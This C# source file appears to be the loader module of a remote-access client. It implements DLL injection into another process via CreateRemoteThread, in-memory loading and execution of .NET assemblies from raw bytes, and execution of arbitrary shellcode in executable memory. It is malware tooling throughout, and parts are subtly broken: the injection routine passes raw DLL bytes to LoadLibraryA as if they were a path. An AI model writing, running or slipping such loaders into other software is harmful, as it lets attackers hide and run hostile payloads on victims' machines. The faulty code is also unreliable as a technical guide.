using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace winClient48
{
    internal class clsfnLoader
    {
        public clsfnLoader()
        {

        }

        /// <summary>
        /// Perform DLL injection with DLL PE file.
        /// </summary>
        /// <param name="szDllPath"></param>
        /// <param name="nProcId"></param>
        /// <returns></returns>
        public static (int nCode, string szMsg) fnRemoteThread(byte[] abBuffer, int nProcId)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                //Init
                uint lpThreadId = 0;

                //Obtain process handle
                IntPtr hProc = WinAPI.OpenProcess(WinAPI.PROCESS_ALL_ACCESS, false, nProcId);
                IntPtr loadLibraryAddr = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr rMemoryAddr = WinAPI.VirtualAllocEx(hProc, IntPtr.Zero, (uint)new IntPtr(abBuffer.Length), WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_EXECUTE_READWRITE);
                if (WinAPI.WriteProcessMemory(hProc, rMemoryAddr, abBuffer, (uint)abBuffer.Length, out _))
                {
                    IntPtr hThread = WinAPI.CreateRemoteThread(hProc, IntPtr.Zero, (uint)IntPtr.Zero, loadLibraryAddr, rMemoryAddr, 0, new IntPtr(lpThreadId));
                    szMsg = lpThreadId.ToString();
                }
                else
                {
                    throw new Exception("DLL injection failed.");
                }

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public static (int nCode, string szMsg) fnLoadDotNetDll(byte[] abDllByte, string szTypeName, string szMethodName)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Assembly asm = Assembly.Load(abDllByte);
                Type type = asm.GetType(szTypeName);
                MethodInfo method = type.GetMethod(szMethodName);

                object obj = Activator.CreateInstance(type);
                method.Invoke(obj, null);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// Perform DLL injection with reflective method.
        /// </summary>
        /// <param name="abShellCode"></param>
        /// <param name="nProcId"></param>
        /// <returns></returns>
        public static (int nCode, string szMsg) fnInjectShellCode(byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                IntPtr lpAddr = WinAPI.VirtualAlloc(IntPtr.Zero, (uint)abShellCode.Length, WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(abShellCode, 0, lpAddr, abShellCode.Length);

                WinAPI.CreateThread(IntPtr.Zero, 0, lpAddr, IntPtr.Zero, 0, out _);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }
    }
}
